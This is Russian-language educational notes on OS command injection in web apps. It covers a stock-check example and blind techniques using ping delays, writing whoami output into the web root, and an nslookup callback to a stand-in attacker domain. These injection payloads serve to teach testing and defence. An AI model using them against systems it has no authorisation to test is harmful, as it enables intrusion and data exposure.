В этом примере приложение для покупок позволяет пользователю просматривать, есть ли товар на складе в конкретном магазине. Доступ к этой информации осуществляется по URL-адресу: `https://insecure-website.com/stockStatus?productID=381&storeID=29`
Функциональность реализуется путем вызова команды командной строки с идентификаторами продукта и хранилища в качестве аргументов: `stockreport.pl 381 29`
Эта команда выводит состояние запасов для указанного товара, которое возвращается пользователю. Приложение не реализует защиту от внедрения команд операционной системы, поэтому злоумышленник может ввести следующие входные данные для выполнения произвольной команды: `||echo aiwefwlguh||`. Если этот ввод представлен в параметре `ProductID`, команда, выполняемая приложением, является:`stockreport.pl & echo aiwefwlguh & 29`. Команда `echo` приводит к повторению предоставленной строки в выходных данных. Это полезный способ тестирования некоторых типов внедрения команд операционной системы. Символ `&` является разделителем команд оболочки. В этом примере он вызывает выполнение трех отдельных команд, одну за другой. Результат, возвращаемый пользователю, является: `Error - productID was not provided aiwefwlguh 29: command not found`. Исходная `stockreport.pl` команда была выполнена без ожидаемых аргументов и поэтому вернула сообщение об ошибке. Введенная команда `echo` была выполнена, и предоставленная строка была воспроизведена в выходных данных. Исходный аргумент `29` был выполнен как команда, что вызвало ошибку.

# Уязвимости при слепом внедрении команд операционной системы
Представим сайт который херачит письмецо через команду: `mail -s "This site is great" -aFrom: peter@normal-user.net feedback@vulnerable-website.com`
У нас не будет выходных данных, поэтому `echo` не поможет, надо делать по другому, и вот способы:
#### Обнаружение слепого внедрения команд операционной системы с использованием временных задержек
Есть команда `ping` с её помощью можно контролировать время, например так: `& ping -c 10 127.0.0.1 &`. Командой сетевой адаптер бесконечно пингует себя в течение 10 секунд.
#### Использование слепого внедрения команд операционной системы путем перенаправления выходных данных
Интересный метод, записать команду в файл, а после перейти по директории этого файла, например так `||whoami > /var/www/images/whoami.txt||`. Чтобы найти файл, можно попробовать https://vuln-website.com/var/www/images/whoami.txt
#### Использование слепого внедрения команд операционной системы с использованием внеполосных методов (OAST)
Вы можете использовать введенную команду, которая запустит внеполосное сетевое взаимодействие с системой, которой вы управляете, используя методы OAST. Например: `||nslookup kgji2ohoyw.web-attacker.com||` Можно чекнуть запросы и понять, прошла ли атака
